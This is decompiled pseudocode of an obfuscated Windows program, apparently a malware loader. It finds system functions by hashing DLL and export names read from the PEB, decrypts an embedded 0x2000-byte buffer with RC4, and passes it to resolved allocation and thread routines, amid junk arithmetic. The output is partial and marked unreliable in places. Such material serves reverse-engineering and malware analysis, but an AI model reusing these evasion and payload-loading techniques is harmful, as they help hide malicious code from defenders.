/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

void sub_4012B7();
int __stdcall sub_401570(int, int);
void sub_401FDB();
// void __usercall sub_402266(int@<esi>);
void sub_40263D();
// void __usercall start(int@<edx>, int@<ecx>, int@<ebx>, int@<edi>, int@<esi>);
// void __usercall sub_403CED(int@<eax>);
void __fastcall sub_404136(__int16);
// void __usercall sub_404865(unsigned int@<ecx>, int@<ebx>, void *@<edi>, const void *@<esi>);
// struct _LIST_ENTRY *__usercall sub_404EAF@<eax>(char@<ch>);
// unsigned int __usercall sub_405533@<eax>(int@<edx>, int@<ebx>);
_BYTE *__cdecl sub_4056BF(_BYTE *, _BYTE *);
// char *__usercall sub_405B51@<eax>(char@<ch>, int);
// void __usercall sub_405F52(int@<ebx>);
// int __usercall sub_406164@<eax>(int@<ebx>);
// char __usercall sub_40650D@<al>(_DWORD *@<ebp>);
// int __usercall sub_4065C1@<eax>(__int16@<cx>, int@<ebx>);
char sub_406708();
int __cdecl sub_406AB1(int, int, unsigned __int8 *);
unsigned int __cdecl sub_406E45(_BYTE *);
// void __usercall sub_409C94(bool@<pf>, int _EAX@<eax>, char@<cl>, int@<ebp>, int@<edi>, int _ESI@<esi>);
// void __usercall __noreturn sub_40C00F(char@<al>, int@<edx>, char@<ch>, int@<ebx>, _DWORD *@<edi>);
// void __usercall __noreturn sub_40D1DC(int@<eax>, char@<cl>, int _ESI@<esi>);

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN unk_41FA83; // weak
_UNKNOWN unk_41FB83; // weak
int dword_437004 = 0; // weak
int dword_437008 = 0; // weak
int dword_43700C = 0; // weak
int dword_437010 = 0; // weak
int dword_437014 = 0; // weak
int dword_437018 = 0; // weak
int dword_43701C = 0; // weak
int dword_437020 = 0; // weak
int dword_437024 = 0; // weak
int dword_437028 = 0; // weak
int dword_43702C = 0; // weak
int dword_437030 = 0; // weak
int dword_437034 = 0; // weak
int dword_437038 = 0; // weak
int dword_43703C = 0; // weak
int dword_437040 = 0; // weak
int dword_437044 = 0; // weak
int dword_437048 = 0; // weak
int dword_43704C = 0; // weak
int dword_4370B8 = 0; // weak
int dword_4372A0 = 684; // weak
char byte_437374 = '\0'; // weak
int dword_437530 = -385875843; // weak
int dword_437668 = 3373; // weak
int dword_4376C4 = 1879836103; // weak
char byte_43771C = '3'; // weak
int dword_437748 = 25615; // weak
char byte_437834 = '‹'; // weak
int dword_4378C4 = 1131418685; // weak
int dword_437904 = -1081394049; // weak
int dword_437C40 = 1023606851; // weak
int dword_438218 = -1396732592; // weak
char byte_438610 = 'p'; // weak
int dword_4387B2 = 88675123; // weak
int dword_4387BA = 521288629; // weak
int dword_4387BE = 0; // weak
int dword_4387DA = 0; // weak
int dword_4387E0 = 0; // weak
int (__thiscall *dword_4387E6)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int dword_4387EA = 0; // weak
int dword_4387FA = 0; // weak
int dword_4387FE = 40780; // weak
int (__thiscall *dword_438806)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
_UNKNOWN unk_438812; // weak
int dword_438814 = 0; // weak
int dword_438818 = 0; // weak
int (__fastcall *dword_43881C)(_DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int dword_438824 = 0; // weak
int dword_438828 = 0; // weak
int dword_438830 = 0; // weak
int dword_438834 = 1178136593; // weak
int (__fastcall *dword_43884C)(_DWORD, _DWORD) = NULL; // weak
_UNKNOWN unk_438860; // weak
int dword_438948 = 0; // weak
_UNKNOWN unk_43896B; // weak
int dword_438973 = 0; // weak
int (__stdcall *dword_43897B)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int dword_43897F = 362436069; // weak
int dword_43899C = 0; // weak
// extern HANDLE (__stdcall *CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// extern BOOL (__stdcall *FreeLibrary)(HMODULE hLibModule);
// extern DWORD (__stdcall *GetCurrentProcessId)();
// extern void (__stdcall *GetSystemTimeAsFileTime)(LPFILETIME lpSystemTimeAsFileTime);
// extern DWORD (__stdcall *GetTickCount)();
// extern void (__stdcall *LeaveCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern HLOCAL (__stdcall *LocalAlloc)(UINT uFlags, SIZE_T uBytes);
// extern LPVOID (__stdcall *VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);


//----- (004012B7) --------------------------------------------------------
void sub_4012B7()
{
  GetCurrentProcessId();
  JUMPOUT(0x401C88);
}
// 4039D3: control flows out of bounds to 401C88

//----- (00401570) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __stdcall sub_401570(int a1, int a2)
{
  sub_4012B7();
  sub_4012B7();
  sub_4012B7();
  sub_4012B7();
  return 5259;
}
// 401C49: positive sp value 1C0 has been found

//----- (00401FDB) --------------------------------------------------------
void sub_401FDB()
{
  char v0; // cf
  __int16 v1; // ax
  int v2; // ecx
  int v3; // eax
  int v4; // eax
  unsigned int v5; // eax
  unsigned int v6; // eax
  int v7; // [esp+2Ch] [ebp-26Ch]
  unsigned __int8 v8; // [esp+90h] [ebp-208h]
  int v9; // [esp+BCh] [ebp-1DCh]
  int v10; // [esp+ECh] [ebp-1ACh]
  int v11; // [esp+118h] [ebp-180h]
  unsigned int v12; // [esp+1DCh] [ebp-BCh]
  unsigned __int16 v13; // [esp+280h] [ebp-18h]

  sub_401570(42, -906900240);
  sub_4012B7();
  v1 = sub_401570(22, v7);
  v3 = v13 & (unsigned __int16)(v0 + v1 + 10731) & 0x109B;
  if ( (v3 & 0x2D04) == 0 )
    LOWORD(v3) = v8 - (__CFADD__(v3, v3) + 2686);
  v4 = __CFADD__(((_WORD)v3 + 5384) & 0x962, v10) + (((_WORD)v3 + 5384) & 0x962) + 11758;
  if ( v9 != v4 )
  {
    if ( v4 >= 0 )
    {
      v6 = v4 - v11;
      if ( (v2 & 0x3062) != 0 )
      {
        v5 = 2 * v6 - (((v6 | 0x24A700000000i64) + (unsigned __int64)v6) >> 32);
        if ( v12 >= v5 )
        {
          if ( !v2 )
            JUMPOUT(0x4015FC);
          JUMPOUT(0x403650);
        }
        JUMPOUT(0x40138B);
      }
      JUMPOUT(0x404103);
    }
    JUMPOUT(0x402549);
  }
  JUMPOUT(0x4019F5);
}
// 401E7C: control flows out of bounds to 404103
// 404480: control flows out of bounds to 4015FC
// 4021CB: control flows out of bounds to 40138B
// 404468: control flows out of bounds to 403650
// 40479F: control flows out of bounds to 4019F5
// 4047A7: control flows out of bounds to 402549
// 403FFA: variable 'v7' is possibly undefined
// 4021CB: variable 'v12' is possibly undefined
// 40441C: variable 'v10' is possibly undefined
// 404006: variable 'v13' is possibly undefined
// 403FFF: variable 'v0' is possibly undefined
// 403046: variable 'v8' is possibly undefined
// 404468: variable 'v2' is possibly undefined
// 40479F: variable 'v9' is possibly undefined
// 4047B3: variable 'v11' is possibly undefined

//----- (00402266) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_402266(int a1@<esi>)
{
  LOBYTE(dword_43704C) = dword_43704C - 49;
  sub_405533(dword_4387BE, (int)&FreeLibrary);
  dword_437010 = a1 - 15582;
  LOBYTE(dword_437034) = -21;
  dword_437004 -= 362;
  LOBYTE(dword_437024) = dword_437024 - 118;
  dword_43700C = (int)&FreeLibrary;
  dword_437018 = dword_438218;
  __asm { retn }
}
// 405909: positive sp value 4 has been found
// 437004: using guessed type int dword_437004;
// 43700C: using guessed type int dword_43700C;
// 437010: using guessed type int dword_437010;
// 437018: using guessed type int dword_437018;
// 437024: using guessed type int dword_437024;
// 437034: using guessed type int dword_437034;
// 43704C: using guessed type int dword_43704C;
// 438218: using guessed type int dword_438218;
// 4387BE: using guessed type int dword_4387BE;
// 438818: using guessed type int dword_438818;
// 438834: using guessed type int dword_438834;

//----- (0040263D) --------------------------------------------------------
void sub_40263D()
{
  JUMPOUT(0x401A17);
}
// 402520: control flows out of bounds to 401A17
// 402538: control flows out of bounds to 404750

//----- (00403A7A) --------------------------------------------------------
void __usercall start(int a1@<edx>, int a2@<ecx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>)
{
  char v5; // cf
  int v6; // eax
  int v7; // edx
  int v8; // edx
  int v9; // [esp+108h] [ebp-90h]
  int savedregs; // [esp+198h] [ebp+0h] BYREF

  dword_438828 = a3;
  unk_43896B = a5;
  dword_4387EA = a4;
  dword_438824 = a1;
  dword_438830 = a2;
  LOBYTE(dword_43700C) = dword_43700C + 90;
  dword_4387FA = (int)&savedregs;
  sub_4012B7();
  sub_403CED(v9 + v5 + v6);
  sub_403CED(0);
  sub_401570(22, v7);
  sub_401570(62, v8);
  JUMPOUT(0x401585);
}
// 4041A1: control flows out of bounds to 401585
// 401E61: variable 'v9' is possibly undefined
// 401E61: variable 'v5' is possibly undefined
// 401E61: variable 'v6' is possibly undefined
// 4032F0: variable 'v7' is possibly undefined
// 4034E8: variable 'v8' is possibly undefined
// 43700C: using guessed type int dword_43700C;
// 4387EA: using guessed type int dword_4387EA;
// 4387FA: using guessed type int dword_4387FA;
// 438824: using guessed type int dword_438824;
// 438828: using guessed type int dword_438828;
// 438830: using guessed type int dword_438830;

//----- (00403CED) --------------------------------------------------------
void __usercall sub_403CED(int a1@<eax>)
{
  int v1; // ecx
  int v2; // edx
  int v3; // [esp+158h] [ebp-C0h]

  sub_401570(45, a1);
  sub_4012B7();
  if ( !v2 && (v1 & v3) == 0 )
    JUMPOUT(0x401808);
  JUMPOUT(0x401986);
}
// 402124: control flows out of bounds to 401986
// 402111: control flows out of bounds to 401808
// 4039C1: variable 'v1' is possibly undefined
// 4039C1: variable 'v3' is possibly undefined
// 4039B8: variable 'v2' is possibly undefined

//----- (00404136) --------------------------------------------------------
void __fastcall sub_404136(__int16 a1)
{
  if ( (a1 & 0x1182) == 0 )
    JUMPOUT(0x404627);
  JUMPOUT(0x40463C);
}
// 40290A: control flows out of bounds to 401A76
// 403EB6: control flows out of bounds to 404627
// 4028B9: control flows out of bounds to 40463C

//----- (00404865) --------------------------------------------------------
void __usercall sub_404865(unsigned int a1@<ecx>, int a2@<ebx>, void *a3@<edi>, const void *a4@<esi>)
{
  dword_437020 += a2;
  qmemcpy(a3, a4, a1);
}
// 437020: using guessed type int dword_437020;

//----- (00404EAF) --------------------------------------------------------
struct _LIST_ENTRY *__usercall sub_404EAF@<eax>(char a1@<ch>)
{
  struct _LIST_ENTRY *v1; // esi
  int v2; // ebx
  struct _LIST_ENTRY *v3; // ebx
  char v4; // cf
  int v5; // edx
  int v6; // edi
  bool v7; // cf
  int v8; // ecx
  char *v9; // edi
  struct _PEB_LDR_DATA *Ldr; // edx
  struct _LIST_ENTRY *Flink; // edx
  void (__stdcall **Flink_low)(LPFILETIME); // eax
  struct _LIST_ENTRY *result; // eax

  LOBYTE(dword_43703C) = -93;
  Ldr = NtCurrentPeb()->Ldr;
  LOBYTE(dword_437038) = -28;
  Flink = Ldr->InMemoryOrderModuleList.Flink;
  Flink_low = &GetSystemTimeAsFileTime;
  LOBYTE(dword_437030) = 62;
  do
  {
    v1 = Flink[5].Flink;
    v8 = 24;
    v9 = 0;
    do
    {
      v2 = (unsigned __int8)Flink_low >> 4;
      Flink_low = (void (__stdcall **)(LPFILETIME))LOBYTE(v1->Flink);
      v1 = (struct _LIST_ENTRY *)((char *)v1 + 1);
      dword_437018 = v2;
      if ( (char)Flink_low >= 97 )
      {
        dword_43703C += v2;
        v4 = (unsigned __int8)Flink_low < 0x20u;
        LOBYTE(Flink_low) = (_BYTE)Flink_low - 32;
        v2 += v4 + 23220;
        dword_43704C = 26804;
      }
      dword_437018 -= v2;
      v6 = __ROR4__(v9, 13);
      v7 = __CFADD__(Flink_low, v6);
      v9 = (char *)Flink_low + v6;
      dword_437014 = dword_438948;
      --v8;
    }
    while ( v8 );
    v3 = Flink[2].Flink;
    v4 = __CFADD__(v7, Flink) | __CFADD__((char *)Flink + v7, 25864);
    Flink = Flink->Flink;
    dword_437040 += 23020;
  }
  while ( v9 != (char *)1783282779 );
  dword_437048 = v4 + 23929;
  v5 = (unsigned int)Flink | 0x187B;
  result = v3;
  dword_43701C = 1783282779;
  LOBYTE(v5) = a1;
  dword_437020 += 19274;
  dword_437040 -= v5;
  LOBYTE(dword_437014) = -115;
  return result;
}
// 437014: using guessed type int dword_437014;
// 437018: using guessed type int dword_437018;
// 43701C: using guessed type int dword_43701C;
// 437020: using guessed type int dword_437020;
// 437030: using guessed type int dword_437030;
// 437038: using guessed type int dword_437038;
// 43703C: using guessed type int dword_43703C;
// 437040: using guessed type int dword_437040;
// 437048: using guessed type int dword_437048;
// 43704C: using guessed type int dword_43704C;
// 438948: using guessed type int dword_438948;

//----- (00405533) --------------------------------------------------------
unsigned int __usercall sub_405533@<eax>(int a1@<edx>, int a2@<ebx>)
{
  unsigned int result; // eax
  unsigned int retaddr; // [esp+0h] [ebp+0h]

  BYTE1(a2) = 57;
  dword_438834 ^= a1 + 577;
  dword_43700C = 12301;
  result = retaddr & 0xFFFF0000;
  dword_43701C -= a2;
  dword_437004 = 5092;
  dword_437018 = (int)&CreateThread;
  dword_438818 = retaddr & 0xFFFF0000;
  return result;
}
// 437004: using guessed type int dword_437004;
// 43700C: using guessed type int dword_43700C;
// 437018: using guessed type int dword_437018;
// 43701C: using guessed type int dword_43701C;
// 438818: using guessed type int dword_438818;
// 438834: using guessed type int dword_438834;

//----- (004056BF) --------------------------------------------------------
_BYTE *__cdecl sub_4056BF(_BYTE *a1, _BYTE *a2)
{
  _BYTE *result; // eax
  char v3; // cl

  result = a1;
  v3 = *a1;
  *a1 = *a2;
  *a2 = v3;
  return result;
}

//----- (00405B51) --------------------------------------------------------
char *__usercall sub_405B51@<eax>(char a1@<ch>, int a2)
{
  unsigned int i; // esi
  struct _LIST_ENTRY *v4; // ebx
  _DWORD *v5; // edi
  unsigned __int16 *v6; // [esp+18h] [ebp-Ch]
  _DWORD *v7; // [esp+1Ch] [ebp-8h]
  int v8; // [esp+20h] [ebp-4h]

  v4 = sub_404EAF(a1);
  v5 = (struct _LIST_ENTRY **)((char *)&v4->Flink + *(unsigned int *)((char *)&v4[15].Flink + (unsigned int)v4[7].Blink));
  if ( HIWORD(a2) )
  {
    v7 = (struct _LIST_ENTRY **)((char *)&v4->Flink + v5[8]);
    v6 = (unsigned __int16 *)((char *)v4 + v5[9]);
    for ( i = 0; v5[6] > i; ++i )
    {
      if ( sub_406E45((_BYTE *)v4 + *v7) == a2 )
      {
        v8 = *v6;
        break;
      }
      ++v7;
      ++v6;
    }
    if ( v5[6] == i )
      return 0;
  }
  else
  {
    v8 = (unsigned __int16)a2 - v5[4];
  }
  return (char *)v4 + *(unsigned int *)((char *)&v4->Flink + 4 * v8 + v5[7]);
}
// 407222: variable 'v8' is possibly undefined

//----- (00405F52) --------------------------------------------------------
void __usercall sub_405F52(int a1@<ebx>)
{
  char v1; // cl
  int v2; // ecx
  int v3; // ecx
  int v4; // edi
  int v5; // esi
  int v6; // ebx
  int v7; // ecx
  int v8; // ebx
  int v9; // edx
  int v10; // ecx
  int v11; // eax
  _BYTE *v12; // edi
  char v13; // cf
  int v14; // ebx
  int v15; // ebx
  char v16; // al
  int v17; // edx
  char v18; // ch
  int v19; // ecx
  int v20; // edx
  int v21; // [esp-8h] [ebp-8h]
  int v22; // [esp-4h] [ebp-4h]
  int v23; // [esp-4h] [ebp-4h]

  dword_437040 += 3856;
  v3 = 0x2000;
  dword_43703C = 566;
  v4 = (int)&unk_41FB83;
  do
  {
    v15 = a1 << 6;
    v23 = v3;
    v16 = sub_406164(v15);
    dword_437010 += 14656;
    *(_BYTE *)v4++ = v16;
    a1 = dword_4376C4 + v15;
    dword_437028 -= v17 + 32199;
    v3 = v23 - 1;
  }
  while ( v23 != 1 );
  dword_437028 = v4;
  dword_43700C = 1483;
  dword_43881C(-7283, v4 ^ v17, 255, &unk_41FA83);
  BYTE1(v19) = byte_43771C + v18;
  dword_437034 = v20;
  dword_437030 += 31909;
  dword_438806(dword_43899C + (v19 ^ 0x32CC), &unk_41FA83, &unk_438812, 0, &unk_438860);
  v14 = v13 + 19846;
  LOBYTE(dword_437020) = 72;
  dword_43702C += (v4 - 1) | 0x669;
  dword_437008 += v14;
  dword_437044 = 22067;
  v22 = dword_43897B(&unk_438860, -1073741824, 1, 0, 2, 32, 0);
  LOBYTE(v2) = BYTE1(v14) ^ 5 ^ v1;
  dword_43702C = (int)&VirtualAlloc;
  dword_437028 -= v2;
  dword_437044 = dword_4387E0;
  v8 = dword_4387E0;
  dword_4387E6(v2 - dword_437668, v22, &unk_41FB83, 0x2000, &dword_4387DA, 0, v22);
  v11 = dword_43884C(4 * v10, v9 + 1);
  dword_437024 += 32738;
  BYTE1(v8) ^= 0xD5u;
  dword_437034 -= 24030;
  v8 |= 0x502Eu;
  BYTE1(v8) = 41;
  v7 = 0x2000;
  v6 = v8 + 4019;
  v5 = v11 - 27226;
  v12 = &unk_41FB83;
  dword_43704C += v6;
  do
  {
    dword_437020 += 17605;
    v21 = v7;
    dword_437018 -= v5;
    *v12++ = sub_406164(v6);
    dword_43700C = 26529;
    v5 = 30303;
    v6 = 7758;
    v7 = v21 - 1;
  }
  while ( v21 != 1 );
  JUMPOUT(0x40524F);
}
// 406633: control flows out of bounds to 40524F
// 406626: conditional instruction was optimized away because %0x18.4==1
// 406DC4: variable 'v17' is possibly undefined
// 407521: variable 'v18' is possibly undefined
// 40754E: variable 'v20' is possibly undefined
// 40752E: variable 'v19' is possibly undefined
// 406B66: variable 'v13' is possibly undefined
// 4054A8: variable 'v1' is possibly undefined
// 4062D7: variable 'v2' is possibly undefined
// 406606: variable 'v10' is possibly undefined
// 406605: variable 'v9' is possibly undefined
// 437008: using guessed type int dword_437008;
// 43700C: using guessed type int dword_43700C;
// 437010: using guessed type int dword_437010;
// 437018: using guessed type int dword_437018;
// 437020: using guessed type int dword_437020;
// 437024: using guessed type int dword_437024;
// 437028: using guessed type int dword_437028;
// 43702C: using guessed type int dword_43702C;
// 437030: using guessed type int dword_437030;
// 437034: using guessed type int dword_437034;
// 43703C: using guessed type int dword_43703C;
// 437040: using guessed type int dword_437040;
// 437044: using guessed type int dword_437044;
// 43704C: using guessed type int dword_43704C;
// 437668: using guessed type int dword_437668;
// 4376C4: using guessed type int dword_4376C4;
// 43771C: using guessed type char byte_43771C;
// 4387DA: using guessed type int dword_4387DA;
// 4387E0: using guessed type int dword_4387E0;
// 4387E6: using guessed type int (__thiscall *dword_4387E6)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 438806: using guessed type int (__thiscall *dword_438806)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43881C: using guessed type int (__fastcall *dword_43881C)(_DWORD, _DWORD, _DWORD, _DWORD);
// 43884C: using guessed type int (__fastcall *dword_43884C)(_DWORD, _DWORD);
// 43897B: using guessed type int (__stdcall *dword_43897B)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43899C: using guessed type int dword_43899C;

//----- (00406164) --------------------------------------------------------
int __usercall sub_406164@<eax>(int a1@<ebx>)
{
  unsigned int v1; // eax
  unsigned int v2; // ebx
  int result; // eax

  dword_437010 -= a1;
  dword_437014 = 19610;
  v1 = dword_4387FE ^ (dword_4387FE << 11);
  v2 = 4 * ((unsigned int)(7983 - dword_437530) >> 5) + 28120;
  dword_4387FE = dword_43897F;
  BYTE1(v2) -= byte_437374;
  dword_437034 = v2;
  LOBYTE(dword_437010) = -24;
  dword_43897F = dword_4387BA;
  dword_4387BA = dword_4387B2;
  LOBYTE(dword_437024) = 97;
  LOBYTE(dword_437044) = 2;
  dword_4387B2 ^= (v1 >> 8) ^ v1 ^ ((unsigned int)dword_4387B2 >> 19);
  dword_4387BE = dword_4387B2;
  dword_43704C = 6468;
  result = dword_4387B2;
  dword_437030 = dword_4378C4 + dword_4372A0 - 30530;
  dword_437028 -= dword_4378C4 + dword_4372A0;
  dword_437038 += (dword_4387B2 - 1) ^ 0x29DD;
  return result;
}
// 437010: using guessed type int dword_437010;
// 437014: using guessed type int dword_437014;
// 437024: using guessed type int dword_437024;
// 437028: using guessed type int dword_437028;
// 437030: using guessed type int dword_437030;
// 437034: using guessed type int dword_437034;
// 437038: using guessed type int dword_437038;
// 437044: using guessed type int dword_437044;
// 43704C: using guessed type int dword_43704C;
// 4372A0: using guessed type int dword_4372A0;
// 437374: using guessed type char byte_437374;
// 437530: using guessed type int dword_437530;
// 4378C4: using guessed type int dword_4378C4;
// 4387B2: using guessed type int dword_4387B2;
// 4387BA: using guessed type int dword_4387BA;
// 4387BE: using guessed type int dword_4387BE;
// 4387FE: using guessed type int dword_4387FE;
// 43897F: using guessed type int dword_43897F;

//----- (0040650D) --------------------------------------------------------
char __usercall sub_40650D@<al>(_DWORD *a1@<ebp>)
{
  char result; // al
  int v2; // esi
  unsigned __int8 v3; // bl

  v3 = *(_BYTE *)(a1[4] + 256);
  *((_BYTE *)a1 - 1) = *(_BYTE *)(a1[4] + 257);
  v2 = a1[4];
  *(a1 - 2) = 0;
  for ( *(a1 - 3) = a1[2]; *(a1 - 2) < a1[3]; ++*(a1 - 3) )
  {
    v3 = (v3 + 1) % 256;
    *((_BYTE *)a1 - 1) += *(_BYTE *)(v2 + v3);
    sub_4056BF((_BYTE *)(v2 + v3), (_BYTE *)(v2 + *((unsigned __int8 *)a1 - 1)));
    *(_BYTE *)*(a1 - 3) ^= *(_BYTE *)(v2
                                    + (unsigned __int8)(*(_BYTE *)(v2 + *((unsigned __int8 *)a1 - 1))
                                                      + *(_BYTE *)(v2 + v3)));
    ++*(a1 - 2);
  }
  *(_BYTE *)(a1[4] + 256) = v3;
  result = *((_BYTE *)a1 - 1);
  *(_BYTE *)(a1[4] + 257) = result;
  return result;
}

//----- (004065C1) --------------------------------------------------------
int __usercall sub_4065C1@<eax>(__int16 a1@<cx>, int a2@<ebx>)
{
  unsigned int v2; // ebx
  int v3; // ecx
  unsigned int v4; // ebx
  int v5; // ecx
  int v6; // ebx
  void (__stdcall **v7)(LPCRITICAL_SECTION); // ebx
  int v8; // ebx
  int result; // eax
  int v10; // ebx
  int v11; // ebx
  int v12; // [esp-4h] [ebp-4h]
  char v13; // [esp-3h] [ebp-3h]

  dword_437020 = a2;
  result = (int)sub_405B51((unsigned __int16)(a1 + 9622) >> 8, 262468866);
  if ( result )
  {
    v8 = dword_437748;
    dword_438806 = (int (__thiscall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))result;
    BYTE1(v8) = BYTE1(dword_437748) - 22;
    v10 = v8 - 1;
    result = (int)sub_405B51(SBYTE1(v10), 1493072574);
    if ( result )
    {
      LOBYTE(dword_43700C) = 0;
      dword_43881C = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD))result;
      dword_43702C = 30713;
      v11 = dword_4370B8 + v10;
      result = (int)sub_405B51(62, 150532372);
      v2 = v11 - 1;
      v3 = v12;
      dword_437028 -= v12;
      BYTE1(v2) = byte_438610;
      v4 = v2 >> 1;
      if ( result )
      {
        dword_437038 -= 26488;
        BYTE1(v3) = BYTE1(v12) - 66;
        dword_43897B = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))result;
        dword_437008 += v3;
        result = (int)sub_405B51(BYTE1(v12) - 66, 1916711125);
        dword_437038 -= v5;
        v6 = v4 + 18332;
        if ( result )
        {
          dword_437024 = v6;
          dword_43884C = (int (__fastcall *)(_DWORD, _DWORD))result;
          LOBYTE(dword_437028) = 36;
          result = (int)sub_405B51(116, -2114916129);
          LOBYTE(dword_437040) = dword_437040 + 68;
          if ( result )
          {
            dword_438973 = result;
            result = (int)sub_405B51(v13, 1216340331);
            dword_437040 -= 16895;
            if ( result )
            {
              dword_438814 = result;
              dword_437030 = (int)&GetTickCount + dword_437C40;
              result = (int)sub_405B51((unsigned __int16)((unsigned __int16)&LocalAlloc + dword_437904) >> 8, 255840707);
              if ( result )
              {
                v7 = &LeaveCriticalSection;
                dword_4387E6 = (int (__thiscall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))result;
                LOBYTE(v7) = byte_437834;
                sub_405F52((int)v7);
                LOBYTE(dword_437028) = dword_437028 - 80;
                dword_43703C -= 15658;
                result = 25770;
                dword_437024 = 26586;
              }
            }
          }
        }
      }
    }
  }
  return result;
}
// 40489C: variable 'v12' is possibly undefined
// 4048E3: variable 'v5' is possibly undefined
// 40596A: variable 'v13' is possibly undefined
// 437008: using guessed type int dword_437008;
// 43700C: using guessed type int dword_43700C;
// 437020: using guessed type int dword_437020;
// 437024: using guessed type int dword_437024;
// 437028: using guessed type int dword_437028;
// 43702C: using guessed type int dword_43702C;
// 437030: using guessed type int dword_437030;
// 437038: using guessed type int dword_437038;
// 43703C: using guessed type int dword_43703C;
// 437040: using guessed type int dword_437040;
// 4370B8: using guessed type int dword_4370B8;
// 437748: using guessed type int dword_437748;
// 437834: using guessed type char byte_437834;
// 437904: using guessed type int dword_437904;
// 437C40: using guessed type int dword_437C40;
// 438610: using guessed type char byte_438610;
// 4387E6: using guessed type int (__thiscall *dword_4387E6)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 438806: using guessed type int (__thiscall *dword_438806)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 438814: using guessed type int dword_438814;
// 438818: using guessed type int dword_438818;
// 43881C: using guessed type int (__fastcall *dword_43881C)(_DWORD, _DWORD, _DWORD, _DWORD);
// 43884C: using guessed type int (__fastcall *dword_43884C)(_DWORD, _DWORD);
// 438973: using guessed type int dword_438973;
// 43897B: using guessed type int (__stdcall *dword_43897B)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00406708) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
char sub_406708()
{
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  return sub_40650D(&savedregs);
}
// 40670B: bad sp value at call

//----- (00406AB1) --------------------------------------------------------
int __cdecl sub_406AB1(int a1, int a2, unsigned __int8 *a3)
{
  unsigned __int8 v3; // bl
  int result; // eax
  unsigned int i; // esi
  unsigned __int8 v6; // cl
  unsigned int v7; // esi
  unsigned __int8 *v8; // eax
  unsigned __int8 *v9; // [esp+Ch] [ebp-8h]
  unsigned __int8 v10; // [esp+13h] [ebp-1h]

  v7 = 0;
  v8 = a3;
  do
  {
    v6 = v7++;
    *v8++ = v6;
  }
  while ( v7 < 0x100 );
  a3[256] = 0;
  a3[257] = 0;
  v10 = 0;
  v3 = 0;
  v9 = a3;
  for ( i = 0; i < 0x100; ++i )
  {
    v3 = (v3 + *v9 + *(unsigned __int8 *)(a1 + v10)) % 256;
    sub_4056BF(&a3[i], &a3[v3]);
    result = (v10 + 1) / a2;
    v10 = (v10 + 1) % a2;
    ++v9;
  }
  return result;
}

//----- (00406E45) --------------------------------------------------------
unsigned int __cdecl sub_406E45(_BYTE *a1)
{
  unsigned int result; // eax

  result = 0;
  while ( *a1 )
    result = (char)*a1++ ^ ((result >> 25) | (result << 7));
  return result;
}

//----- (00409C94) --------------------------------------------------------
void __usercall sub_409C94(bool a1@<pf>, int _EAX@<eax>, char a3@<cl>, int a4@<ebp>, int a5@<edi>, int _ESI@<esi>)
{
  while ( 1 )
  {
    __asm
    {
      aas
      outsd
    }
    if ( !a1 )
      break;
    _EAX = _EAX + 332626;
    *(_DWORD *)(a4 - 45) -= _ESI;
    LOBYTE(_EAX) = _EAX | 0x22;
    a1 = __SETP__(*(_BYTE *)(a5 + _EAX - 567438549), a3);
    *(_BYTE *)(a5 + _EAX - 567438549) -= a3;
    __asm { into }
  }
  __asm { iret }
  JUMPOUT(0x409C9C);
}
// 409C9B: control flows out of bounds to 409C9C

//----- (0040C00F) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall __noreturn sub_40C00F(char a1@<al>, int a2@<edx>, char a3@<ch>, int a4@<ebx>, _DWORD *a5@<edi>)
{
  MEMORY[0x4E494EA8] &= a4;
  __asm { into }
  *a5 >>= 4;
  __asm { icebp }
  __outbyte(0xB2u, a1 ^ 0xC1);
  *(_BYTE *)(a2 + 98) = a3;
  JUMPOUT(0x80028904);
}
// 40C036: positive sp value 8 has been found
// 40C03A: control flows out of bounds to 80028904

//----- (0040D1DC) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall __noreturn sub_40D1DC(int a1@<eax>, char a2@<cl>, int _ESI@<esi>)
{
  __int16 v3; // [esp-4h] [ebp-4h]

  MEMORY[0x538CFCB4] = a1;
  MEMORY[0x7860217F] <<= a2;
  __DS__ = v3;
  __asm { outsd }
  JUMPOUT(0x2B9);
}
// 40D1F2: positive sp value 4 has been found
// 40D206: unbalanced stack, ignored a potential tail call
// 40D1F1: variable 'v3' is possibly undefined

// nfuncs=24 queued=23 decompiled=23 lumina nreq=0 worse=0 better=0
// ALL OK, 23 function(s) have been successfully decompiled
